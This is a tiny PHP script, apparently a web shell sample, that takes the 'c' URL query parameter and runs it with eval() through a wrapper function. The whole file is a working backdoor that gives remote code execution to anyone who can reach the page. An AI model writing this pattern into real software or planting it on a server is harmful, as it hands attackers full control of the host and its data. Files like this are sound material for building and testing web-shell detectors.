<?php
function doeval($str){
    eval($str);
}

$c = $_GET['c'];
$r = doeval($c);
